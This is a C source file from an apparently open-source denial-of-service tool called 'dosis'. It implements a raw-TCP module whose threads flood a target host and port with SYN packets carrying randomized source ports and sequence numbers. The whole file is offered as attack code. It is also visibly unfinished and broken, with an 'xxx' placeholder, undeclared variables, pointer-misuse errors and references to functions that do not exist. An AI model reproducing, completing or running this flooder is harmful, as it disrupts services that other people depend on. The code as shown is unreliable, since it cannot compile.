/*****************************************************************************
 * tcpraw.c
 *
 * DoS on TCP servers by raw tcp packets (synflood?).
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008 Gerardo García Peña <gerardo@kung-foo.dhs.org>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>

#include "dosis.h"
#include "dosconfig.h"
#include "tcpraw.h"
#include "lnet.h"
#include "pthreadex.h"
#include "log.h"
#include "ip.h"

typedef struct _tag_TCPRAW_CFG {
  INET_ADDR   shost;
  INET_ADDR   dhost;
  unsigned    npackets;
  char       *req;
  unsigned    req_size;
  double     *hitratio;
  LN_CONTEXT  lnc;
} TCPRAW_CFG;

static void tcpraw__configure(THREAD_WORK *tw, SNODE *command)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;

  /* default */
  xxx

  /* read from SNODE command */
  pthreadex_timer_init(&timer, 0.0);
  if(hitratio > 0)
    pthreadex_timer_set_frequency(&timer, cfg->hits);

}

static void tcpraw__thread(THREAD_WORK *tw)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;
  pthreadex_timer_t timer;
  unsigned int seq = libnet_get_prand(LIBNET_PRu32);
  int i;

  DBG("[%02u] Started sender thread", tw->w->id);

  /* ATTACK */
  while(!tw->finalize)
  {
    /* wait for work */
    if(hitratio > 0)
      if(pthreadex_timer_wait(&timer) < 0)
        ERR("Error at pthreadex_timer_wait(): %s", strerror(errno));

    /* check again for finalization */
    if(tw->finalize)
      break;

    /* build TCP packet with payload (if requested) */
    DBG("[%02u] Sending %d packets...", tw->w->id, tw->cfg.npackets);
    for(i = 0; i < tw->cfg.npackets; i++)
    {
      seq += libnet_get_prand(LIBNET_PRu16) & 0x00ff;
      ln_send_packet(&tw->lnc,
                     &tw->cfg.shost.addr.in.inaddr, libnet_get_prand(LIBNET_PRu16),
                     &tw->cfg.dhost.addr.in.inaddr, tw->cfg.dhost.port,
                     TH_SYN, 13337,
                     seq, 0,
                     NULL, 0);
    }
  }

  pthreadex_timer_destroy(&timer);
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * GENERIC HHTP THREAD
 *   This thread specializes in different tasks depending on thread number
 *     0 - listener
 *     x - sender
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static void tcpraw__thread_cleanup(THREAD_WORK *tw)
{
  /* collect libnet data */
  ln_destroy_context(&(tw->lnc));

  DBG("[%02u] Finalized.", tw->w->id);
}

static void tcpraw__thread_launch(THREAD_WORK *tw)
{
  int r;

  /* initialize specialized work thread data */
  tw.w = w;

  /* initialize thread */
  pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, &r);
  pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, &r);
  pthread_cleanup_push((void *) attack_tcpopen__thread_cleanup, &tw);

  /* initialize libnet */
  DBG("[%02u] Initializing libnet.", tw.w->id);
  ln_init_context(&(tw.lnc));

  /* launch specialized thread */
  send_packets(&tw);

  pthread_cleanup_pop(1);
  pthread_exit(NULL);
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * TCPRAW TEA OBJECT
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

TEA_OBJECT teaTCPRAW = {
  .configure = tcpraw__configure,
  .thread    = tcpraw__thread,
  .cleanup   = tcpraw__stop,
};

